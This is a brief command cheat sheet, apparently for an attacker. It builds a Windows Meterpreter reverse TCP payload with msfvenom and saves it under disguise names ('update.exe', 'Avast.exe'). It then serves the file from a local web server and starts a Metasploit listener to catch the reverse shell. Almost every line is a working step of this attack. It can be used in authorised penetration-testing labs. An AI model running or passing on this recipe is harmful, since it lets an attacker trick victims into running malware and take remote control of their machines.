msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe > update.exe
sudo cp Avast.exe /var/www/html
service apache2start
python -m http.server 8080

Starting the Listener:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost (machine ip)
exploit


Note:

module | type of payload | meterpreter shell | taking reverse tcp connection
lhost=ifconfig local ip
